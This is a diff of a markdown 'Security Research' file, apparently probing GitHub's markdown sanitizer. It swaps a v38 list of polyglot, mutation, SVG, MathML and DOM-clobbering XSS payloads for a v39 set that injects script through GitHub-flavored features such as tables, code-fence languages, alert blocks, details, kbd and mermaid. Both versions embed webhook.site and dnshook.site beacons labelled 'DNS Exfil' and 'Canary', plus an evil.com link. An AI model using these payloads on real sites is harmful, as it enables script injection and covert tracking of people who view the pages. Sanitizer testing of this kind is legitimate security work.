@@ -1,224 +1,217 @@
-# Security Research - v38
+# Security Research - v39
 
-## Advanced Polyglot & Mutation XSS Testing
+## GitHub-Specific Features & Anchors
 
-Testing polyglot payloads, mXSS, and advanced bypass techniques.
-
----
-
-### 1) JavaScript URL Variations
-
-[js1](javascript:alert(1))
-
-[js2](javascript&#58;alert(1))
-
-[js3](javascript&#x3a;alert(1))
-
-[js4](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))
-
-[js5](jAvAsCrIpT:alert(1))
-
-[js6](java	script:alert(1))
-
-[js7](java
-script:alert(1))
-
-[js8](\u006aavascript:alert(1))
+Testing GitHub-specific markdown features, relative links, and anchor behavior.
 
 ---
 
-### 2) VBScript Variations
+### 1) Relative URL Resolution
 
-[vbs1](vbscript:msgbox(1))
+[Relative in repo](/test.svg)
 
-[vbs2](vbscript&#58;msgbox(1))
+[Relative with ../](../progsjessi/README.md)
 
-[vbs3](VbScRiPt:msgbox(1))
+[Relative to root](/jessi2000/progsjessi)
 
----
+![Relative img](test.svg)
 
-### 3) Data URI Variations
-
-[data1](data:text/html,<script>alert(1)</script>)
-
-[data2](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
-
-[data3](data&#58;text/html,<script>alert(1)</script>)
+![Relative parent](../progsjessi/test.svg)
 
 ---
 
-### 4) HTML Polyglot Payloads
+### 2) GitHub Anchor Links
 
-<a href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/poly1"<!--><img src=x onerror=alert(1)>-->safe</a>
+[Jump to heading](#security-research---v39)
 
-<a href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/poly2"/**/onclick=alert(1)>click</a>
+[Anchor with special chars](#1-relative-url-resolution)
 
-<a href=javascript:/*</a><img%20src=x%20onerror=alert(1)>//>test</a>
+[Non-existent anchor](#javascript:alert(1))
 
----
+[Hash only](#)
 
-### 5) mXSS (Mutation XSS) Attempts
+<h2 id="custom-id">Custom ID Heading</h2>
 
-<p id="<img src=x onerror=alert(1)>">mXSS test 1</p>
+[Link to custom ID](#custom-id)
 
-<noscript><img src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/noscript.gif"></noscript>
+<h2 id="javascript:alert(1)">JS in ID attempt</h2>
 
-<math><mi><mglyph><svg><a xlink:href="javascript:alert(1)"><text>mXSS</text></a></svg></mglyph></mi></math>
-
----
-
-### 6) SVG-Based XSS
-
-<svg onload="alert(1)">
-
-<svg><script>alert(1)</script></svg>
-
-<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
-
-<svg><animate onbegin=alert(1)></svg>
-
-<svg><set onbegin=alert(1)></svg>
+[Link to JS ID](#javascript:alert(1))
 
 ---
 
-### 7) MathML XSS
+### 3) GitHub Flavored Markdown Extensions
 
-<math><maction actiontype="statusline#http://evil.com">CLICK<mtext>XSS</mtext></maction></math>
+#### Autolinks
 
-<math href="javascript:alert(1)">click</math>
+Visit https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/autolink for info.
 
----
+Email: test@8464777c-99e4-4c6a-9ae2-a591ce00730f.email.webhook.site
 
-### 8) Template Element Injection
+www.webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/www-autolink
 
-<template><script>alert(1)</script></template>
+#### Strikethrough
 
-<template><img src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/template.gif"></template>
+~~<script>alert('strikethrough')</script>~~
 
----
+~~![strike-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/strike.gif)~~
 
-### 9) Slot Element Injection
+#### Emoji
 
-<slot name="<img src=x onerror=alert(1)>">slot content</slot>
+:smile: :+1: :rocket:
 
----
+:javascript:: test
 
-### 10) Custom Element Testing
+#### Mentions
 
-<x-custom onclick="alert(1)">custom element</x-custom>
+@jessi2000 normal mention
 
-<img-x src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/custom-img.gif">
+@<script>alert(1)</script> script in mention
 
----
+@javascript:alert(1) js in mention
 
-### 11) DOM Clobbering Attempts
+#### Issue/PR References
 
-<form id="document"><input name="cookie" value="clobbered"></form>
+#1 normal ref
 
-<img name="location" src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/dom-clob.gif">
+#<script>alert(1)</script> script in ref
 
-<a id="location" href="https://evil.com">clobbered link</a>
-
-<form id="window"><input name="document"></form>
+jessi2000/progsjessi#1 cross-repo ref
 
 ---
 
-### 12) CSS Injection via Attributes
+### 4) Table Advanced Features
 
-<div style="background-image:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/css-bg.gif)">css bg</div>
-
-<div style="behavior:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/htc.htc)">htc</div>
-
-<div style="-moz-binding:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/xbl.xml)">xbl</div>
-
-<div style="expression(alert(1))">expression</div>
+| Column | With | Alignment |
+|:-------|:----:|----------:|
+| Left <script>xss</script> | Center ![](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/table-center.gif) | Right |
+| [Link](javascript:alert(1)) | **Bold** | *Italic* |
+| `code` | ~~strike~~ | normal |
 
 ---
 
-### 13) Import/Include Injection
+### 5) Code Block Language Injection
 
-<link rel="import" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/import.html">
+```javascript<script>alert(1)</script>
+const x = 1;
+```
 
-<link rel="stylesheet" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/style.css">
+```<img src="https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/lang-img.gif">
+some code
+```
 
-<link rel="prefetch" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/prefetch.html">
-
----
-
-### 14) Meta Refresh/Redirect
-
-<meta http-equiv="refresh" content="0;url=https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/meta-refresh">
-
-<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+```javascript" onclick="alert(1)
+let y = 2;
+```
 
 ---
 
-### 15) Object/Embed with Data
+### 6) Inline Code Injection
 
-<object data="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/object.swf">
-<embed src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/embed.swf">
+`<script>alert(1)</script>`
 
-<object type="text/x-scriptlet" data="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/scriptlet.sct">
+`![img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/inline-code.gif)`
 
----
-
-### 16) Applet Tag (Legacy)
-
-<applet code="XSS" codebase="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/">
+``double `backtick` test``
 
 ---
 
-### 17) Marquee/BGSOUND (IE Legacy)
+### 7) Alert/Note Blocks (GFM)
 
-<marquee onstart="alert(1)">XSS</marquee>
+> [!NOTE]
+> This is a note <script>alert(1)</script>
+> ![note-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/note.gif)
 
-<bgsound src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/bgsound.wav">
+> [!WARNING]
+> This is a warning [click](javascript:alert(1))
 
----
-
-### 18) Isindex (Deprecated)
-
-<isindex action="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/isindex">
-
----
-
-### 19) Keygen Element
-
-<keygen autofocus onfocus="alert(1)">
+> [!IMPORTANT]
+> Important info ![important](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/important.gif)
 
 ---
 
-### 20) Details/Summary XSS
+### 8) Collapsed Sections
+
+<details>
+<summary>Click to expand <script>alert(1)</script></summary>
+
+![details-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/details.gif)
+
+<script>alert('inside details')</script>
+
+[evil link](javascript:alert(1))
+
+</details>
 
 <details open ontoggle="alert(1)">
-<summary>Click me</summary>
-Content
+<summary onclick="alert(1)">Auto-expanded</summary>
+Content here
 </details>
 
 ---
 
-### 21) Output Element
+### 9) Keyboard Tags
 
-<output name="result" for="a b">XSS</output>
+<kbd>Ctrl</kbd>+<kbd><script>alert(1)</script></kbd>
+
+<kbd onclick="alert(1)">Click me</kbd>
+
+<kbd><a href="javascript:alert(1)">JS Link</a></kbd>
+
+<kbd><img src="https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/kbd-img.gif"></kbd>
 
 ---
 
-### 22) Menu/MenuItem
+### 10) Abbreviations/Definitions
 
-<menu type="context" id="mymenu">
-<menuitem label="XSS" onclick="alert(1)"></menuitem>
-</menu>
+*[HTML]: <script>alert('abbr')</script>
+*[CSS]: ![abbr-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/abbr.gif)
+
+HTML and CSS are technologies.
+
+---
+
+### 11) Math Blocks (if supported)
+
+$x = y$ inline math
+
+$$
+\text{<script>alert(1)</script>}
+$$
+
+$$
+\href{javascript:alert(1)}{click}
+$$
+
+---
+
+### 12) Mermaid Diagrams (if supported)
+
+```mermaid
+graph TD
+    A[<script>alert(1)</script>] --> B[Normal]
+    B --> C{Decision}
+    click A "javascript:alert(1)" "XSS Attempt"
+```
+
+---
+
+### 13) Video Embed Syntax (if supported)
+
+https://github.com/user-attachments/assets/video.mp4
+
+https://www.youtube.com/watch?v=<script>alert(1)</script>
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v38-dns.2fe47d02-b825-4774-a39b-e7be4327f4e8.dnshook.site/dns.gif)
+![dns](https://v39-dns.8464777c-99e4-4c6a-9ae2-a591ce00730f.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/v38-canary.gif)
+![canary](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/v39-canary.gif)
 
 ---
 
-*v38 - Advanced polyglot & mutation XSS testing*
+*v39 - GitHub-specific features & anchor testing*
